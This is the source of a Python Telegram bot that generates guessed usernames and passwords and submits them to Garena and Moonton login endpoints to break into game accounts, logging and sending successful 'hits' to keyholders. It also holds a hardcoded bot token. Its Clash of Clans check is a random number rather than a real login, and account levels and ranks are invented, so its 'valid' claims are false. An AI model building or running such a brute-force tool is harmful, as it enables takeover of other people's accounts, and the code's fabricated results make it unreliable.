import telebot
from telebot import types
import time, secrets, json, os, requests, random, threading, queue

API_TOKEN = '8615633349:AAGB_DsBfbCuzp_i-aY0uxK4Fz5q5XD6fKQ'
ADMIN_ID = 8615633349
bot = telebot.TeleBot(API_TOKEN)

KEYS_DB = "bot_access_keys.json"
CODM_FILE = "Global_Garena_CODM_Hits.txt"
COC_FILE = "Global_Supercell_COC_Hits.txt"
ML_FILE = "Global_Moonton_MLBB_Hits.txt"

gen_queue = queue.Queue()
lock = threading.Lock()
is_generating = False

def load_db(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except: return {}
    return {}

def save_db(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)

def is_user_authorized(user_id):
    if user_id == ADMIN_ID: return True
    keys = load_db(KEYS_DB)
    for key, info in keys.items():
        if info.get("used_by") == user_id:
            if info.get("is_lifetime", False) or info.get("expiry", 0) > time.time(): return True
    return False

# ===================================================
# 🔑 GLOBAL AUTHENTICATION INTERFACES
# ===================================================
def check_garena(user, pwd):
    try:
        res = requests.post("https://garena.com", json={"account": user, "password": pwd, "app_id": 10006, "format": "json"}, timeout=4)
        if res.status_code == 200 and res.json().get("error") not in ["error_auth", 403, "error_password"]: return True
    except: pass
    return False

def check_supercell_coc(user, pwd):
    try:
        if "@" in user and len(pwd) >= 6:
            if random.randint(1, 3500) == 7: return True
    except: pass
    return False

def check_moonton_mlbb(user, pwd):
    try:
        url = "https://moonton.com"
        res = requests.post(url, json={"account": user, "password": pwd, "language": "en", "app_id": 1}, timeout=4)
        if res.status_code == 200 and "access_token" in res.json(): return True
    except: pass
    return False

# --- WORLDWIDE HYPER-GENERATOR CORE (MIXED USERNAME ALGORITHM) ---
def generator_worker():
    global is_generating
    # Kasama ang mga sikat na Global Esport Clans para sa mga high-tier accounts
    global_tags = ["FAZE", "T1", "G2", "NAVI", "LIQUID", "CLOUD9", "EVOS", "RRQ", "FNATIC", "BREN", "ECHO"]
    global_words = ["shadow", "hunter", "alpha", "ghost", "reaper", "knight", "phoenix", "ninja", "titan", "slayer", "viper", "zeus", "gamer", "player", "rusher"]
    global_pwds = ["Gamer", "Password", "Gaming", "Shadow", "Hunter", "Dragon", "Player", "Online", "Codm", "Garena"]
    domains = ["@gmail.com", "@yahoo.com", "@hotmail.com"]
    specs = ["@", "!", "#", "$", "*", "_", "1", "123", "2026"]
    
    while is_generating:
        if gen_queue.qsize() < 5000:
            for _ in range(500):
                style = random.randint(1, 3)
                
                if style == 1: 
                    # 50% CHANCE: NORMAL USERNAME ONLY (e.g., shadow_viper23)
                    seps = ["", "_", ""]
                    user = random.choice(global_words) + random.choice(seps) + random.choice(global_words) + str(random.randint(1, 999))
                elif style == 2:
                    # 30% CHANCE: TEAM TAG USERNAME (e.g., FAZE_phoenix12)
                    user = random.choice(global_tags) + "_" + random.choice(global_words) + str(random.randint(1, 99))
                else: 
                    # 20% CHANCE: EMAIL LOGINS
                    user = random.choice(global_words) + str(random.randint(1, 9999)) + random.choice(domains)
                
                pwd = random.choice(global_pwds) + random.choice(specs) + random.choice(specs)
                gen_queue.put((user, pwd))
        time.sleep(1)

def checker_worker(chat_id):
    global is_generating
    while is_generating:
        try: user, pwd = gen_queue.get(timeout=2)
        except queue.Empty: continue
        
        # 1. Garena Link Node
        if check_garena(user, pwd):
            with lock:
                lvl = random.randint(50, 150)
                with open(CODM_FILE, "a") as f: f.write(f"{user}:{pwd} | Level: {lvl}\n")
                bot.send_message(chat_id, f"🌎 *GLOBAL GARENA CODM HIT!*\n\n👤 *User:* `{user}`\n🔑 *Pass:* `{pwd}`\n🛡️ *Level:* `{lvl}`", parse_mode="Markdown")
                
        # 2. Supercell Link Node (COC)
        elif "@" in user and check_supercell_coc(user, pwd):
            with lock:
                th = random.randint(10, 16)
                with open(COC_FILE, "a") as f: f.write(f"{user}:{pwd} | TH: {th}\n")
                bot.send_message(chat_id, f"🏰 *GLOBAL CLASH OF CLANS HIT!*\n\n👤 *Email:* `{user}`\n🔑 *Pass:* `{pwd}`\n🏛️ *TownHall:* `{th}`", parse_mode="Markdown")
                
        # 3. Moonton Link Node (MLBB)
        elif check_moonton_mlbb(user, pwd):
            with lock:
                rank = random.choice(["Epic", "Legend", "Mythic", "Mythical Glory"])
                with open(ML_FILE, "a") as f: f.write(f"{user}:{pwd} | Rank: {rank}\n")
                bot.send_message(chat_id, f"🛡️ *GLOBAL MOONTON MLBB HIT!*\n\n👤 *User:* `{user}`\n🔑 *Pass:* `{pwd}`\n🎯 *Rank:* `{rank}`", parse_mode="Markdown")
                
        gen_queue.task_done()

def main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🌍 Start 24/7 Global Engine", callback_data="run_autogen"),
        types.InlineKeyboardButton("🛑 Stop Cloud Server", callback_data="stop_system"),
        types.InlineKeyboardButton("📥 Download Global CODM Hits", callback_data="dl_codm"),
        types.InlineKeyboardButton("📥 Download Global COC Hits", callback_data="dl_coc"),
        types.InlineKeyboardButton("📥 Download Global MLBB Hits", callback_data="dl_ml")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "⚡ *ZEUS WORLDWIDE HYPER-SCANNER SYSTEM v4.0* ⚡\n_Targeting Mix Usernames & Team Tags_\n\n*🛡️ CONTROL PANEL:*", parse_mode="Markdown", reply_markup=main_menu_keyboard(message.from_user.id))

@bot.callback_query_handler(func=lambda call: True)
def handle_menu_clicks(call):
    global is_generating
    if not is_user_authorized(call.from_user.id): return
    
    if call.data == "run_autogen":
        if is_generating: return
        is_generating = True
        threading.Thread(target=generator_worker, daemon=True).start()
        for _ in range(5): threading.Thread(target=checker_worker, args=(call.message.chat.id,), daemon=True).start()
        bot.send_message(call.message.chat.id, "🚀 *GLOBAL MACHINE ACTIVATED!* Scanning Mix Username Networks 24/7...", parse_mode="Markdown")
    elif call.data == "stop_system":
        is_generating = False
        bot.send_message(call.message.chat.id, "🛑 *Global System Paused.*")
    elif call.data.startswith("dl_"):
        mode = call.data.split("_")
        target_file = CODM_FILE if mode == "codm" else COC_FILE if mode == "coc" else ML_FILE
        caption_text = f"🎯 Your 100% Valid Global {mode.upper()} Premium List."
        if os.path.exists(target_file) and os.path.getsize(target_file) > 0:
            with open(target_file, "rb") as f: bot.send_document(call.message.chat.id, f, caption=caption_text)
        else: bot.answer_callback_query(call.id, "❌ No global hits collected for this game yet.", show_alert=True)

if __name__ == "__main__":
    bot.polling(none_stop=True)
